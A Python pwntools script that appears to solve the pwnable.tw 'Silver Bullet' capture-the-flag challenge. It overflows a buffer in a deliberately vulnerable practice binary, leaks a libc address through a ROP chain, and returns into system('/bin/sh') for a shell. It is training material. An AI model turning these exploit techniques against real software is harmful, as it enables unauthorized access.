#!/usr/bin/env python3

from pwn import *

DWORD = 4
context.terminal = ['tmux', 'splitw', '-h']

class Advasary:
    def __init__(self):
        self.libc = ELF('./given/libc_32.so.6')
        self.elf = ELF('./pwninit/silver_bullet_patched')

    def conn(self):
        if args.REMOTE:
            return remote('chall.pwnable.tw', 10103)

        ld = ELF('./pwninit/ld-2.23.so')
        p = process([ld.path, self.elf.path], env={
            'LD_PRELOAD': self.libc.path
        })
        if args.GDB:
            gdb.attach(p, '\n'.join([
                'b *0x8048a00', # exit
                # 'b *0x8048907',  # strlen in power_up
            ]))
        return p


    def exploit(self):
        self.p = self.conn()

        bullet_len = self.create_bullet(b'a' * 0x2f)
        bullet_len = self.update_bullet(b'a' * 1)

        # bullet.size will be 1
        plt_puts = 0x80484a8
        got_puts = 0x804afdc
        func_main = 0x8048954
        pop_ret = 0x8048a7b
        rop_chain = [
            b'\xff' * 3,   # bullet.length
            b'a' * DWORD,  # saved_ebp
            p32(plt_puts), #
            p32(pop_ret),
            p32(got_puts),
            p32(func_main),
        ]
        self.update_bullet(b''.join(rop_chain))

        # beat the warewolf to return from main()
        self.p.sendlineafter(b'Your choice :', b'3')
        self.p.recvuntil(b'Oh ! You win !!\n')
        leak = self.p.recvn(DWORD)
        libc_leak = u32(leak)
        log.info(f'libc leak: {hex(libc_leak)}')
        self.libc.address = libc_leak - self.libc.symbols['puts']
        log.info(f'libc base: {hex(self.libc.address)}')

        # Then, we do the same trick again
        self.create_bullet(b'a' * 0x2f) # 0x30 - 1
        self.update_bullet(b'a' * 1)

        rop_chain = [
            b'\xff' * (DWORD - 1),
            b'a' * DWORD,
            p32(self.libc.symbols['system']),
            b'a' * DWORD,
            p32(next(self.libc.search(b'/bin/sh\x00')))
        ]
        self.update_bullet(b''.join(rop_chain))

        # beat the warewolf to return from main()
        self.p.sendlineafter(b'Your choice :', b'3')

        self.p.interactive()

    def update_bullet(self, data: bytes):
        self.p.sendlineafter(b'Your choice :', b'2')
        self.p.sendafter(b'description of bullet :', data)
        self.p.recvuntil(b'Your new power is :')
        res = self.p.recvline()
        string_length = int(res.decode().split('\n')[0])
        return string_length


    def create_bullet(self, data: bytes):
        self.p.sendlineafter(b'Your choice :', b'1')
        self.p.sendafter(b'description of bullet :', data)
        self.p.recvuntil(b'Your power is :')
        res = self.p.recvline()
        string_length = int(res.decode().split('\n')[0])
        return string_length

if __name__ == '__main__':
    adv = Advasary()
    adv.exploit()
